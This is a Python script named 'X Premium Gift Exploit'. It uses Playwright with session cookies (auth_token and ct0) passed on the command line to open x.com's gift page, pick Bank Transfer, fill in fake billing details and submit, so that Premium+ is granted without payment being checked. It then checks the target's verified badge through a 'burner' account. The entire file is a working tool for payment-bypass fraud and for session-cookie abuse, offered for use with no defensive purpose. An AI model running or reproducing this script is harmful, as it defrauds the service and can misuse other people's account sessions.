#!/usr/bin/env python3
"""X Premium Gift Exploit - Lightweight version.
Gift Premium to any account via Bank Transfer (payment not validated).
Usage: python3 x_gift.py <auth_token> <ct0> <target_username>
"""
import asyncio
import sys
import json
from playwright.async_api import async_playwright

async def gift_premium(auth_token: str, ct0: str, target_username: str):
    """Gift 1 year Premium+ to target_username using donor account cookies."""
    
    print(f"\n{'='*50}")
    print(f"[+] Target: @{target_username}")
    print(f"{'='*50}\n")
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context()
        
        await context.add_cookies([
            {"name": "auth_token", "value": auth_token, "domain": ".x.com", "path": "/", "secure": True, "sameSite": "None"},
            {"name": "ct0", "value": ct0, "domain": ".x.com", "path": "/", "secure": True, "sameSite": "None"},
        ])
        
        page = await context.new_page()
        
        # Accept cookies first
        await page.goto("https://x.com", timeout=15000, wait_until="domcontentloaded")
        await asyncio.sleep(2)
        try:
            await page.click("button:has-text('Accept all cookies')", timeout=3000)
        except:
            pass
        await asyncio.sleep(1)
        
        # Navigate to gift page
        print("[*] Loading gift page...")
        try:
            await page.goto(f"https://x.com/{target_username}/gift-premium", timeout=15000, wait_until="domcontentloaded")
        except:
            pass
        await asyncio.sleep(3)
        
        url = page.url
        if "home" in url:
            print("[!] Redirected to home - donor may have hit gift limit")
            await browser.close()
            return False
        
        print("[+] Gift page loaded")
        
        # Click Gift & Pay
        print("[*] Clicking Gift & Pay...")
        try:
            await page.click("button:has-text('Gift & Pay')", timeout=5000)
        except:
            print("[!] Gift button not found")
            await browser.close()
            return False
        await asyncio.sleep(4)
        
        # Select Bank Transfer
        print("[*] Selecting Bank Transfer...")
        await page.evaluate("document.querySelector('[aria-label=\"Bank transfer\"]')?.click()")
        await asyncio.sleep(2)
        
        # Fill form
        print("[*] Filling form...")
        fields = {
            'input[name="email"]': 'payment@tempmail.com',
            'input[name="billingName"]': 'John Doe',
            'input[name="billingAddressLine1"]': '123 Main Street',
            'input[name="billingAddressLine2"]': 'Apt 1',
            'input[name="billingLocality"]': 'Berlin',
            'input[name="billingPostalCode"]': '10115',
        }
        
        for selector, value in fields.items():
            try:
                await page.fill(selector, value)
            except:
                pass
        
        try:
            await page.select_option('select', 'DE')
        except:
            pass
        
        await asyncio.sleep(1)
        
        # Click Pay
        print("[*] Submitting payment...")
        try:
            await page.click('button:has-text("Pay")', force=True, timeout=5000)
        except:
            pass
        
        await asyncio.sleep(10)
        
        # Check result
        final_url = page.url
        if "bank_transfers" in final_url or "instructions" in final_url:
            print("[+] Bank transfer page reached!")
            
            text = await page.evaluate("document.body.innerText")
            if "IBAN" in text:
                lines = text.split('\n')
                for line in lines:
                    line = line.strip()
                    if line and any(k in line for k in ["IBAN", "Reference", "Account holder"]):
                        print(f"    {line}")
            
            print(f"\n  🎉 Gift sent to @{target_username}!")
            await browser.close()
            return True
        else:
            print(f"[!] Unexpected result: {final_url[:100]}")
            await browser.close()
            return False


async def verify_premium(username: str):
    """Check if account has Premium (verified badge)."""
    proc = await asyncio.create_subprocess_exec(
        "agentx", "user", username, "-a", "burner", "--pretty",
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await proc.communicate()
    
    try:
        data = json.loads(stdout.decode())
        if data.get("ok"):
            user = data["data"]
            verified = user.get("verified", False)
            print(f"\n[{'+' if verified else '!'}] @{username}: verified={verified}")
            return verified
    except:
        pass
    
    print(f"[!] Could not verify @{username}")
    return False


async def main():
    if len(sys.argv) < 4:
        print("Usage: python3 x_gift.py <auth_token> <ct0> <target_username>")
        sys.exit(1)
    
    auth_token = sys.argv[1]
    ct0 = sys.argv[2]
    target = sys.argv[3]
    
    # Verify before
    print("\n=== BEFORE ===")
    await verify_premium(target)
    
    # Gift
    success = await gift_premium(auth_token, ct0, target)
    
    if success:
        await asyncio.sleep(3)
        print("\n=== AFTER ===")
        await verify_premium(target)
    
    print("\n✅ Done!")


if __name__ == "__main__":
    asyncio.run(main())
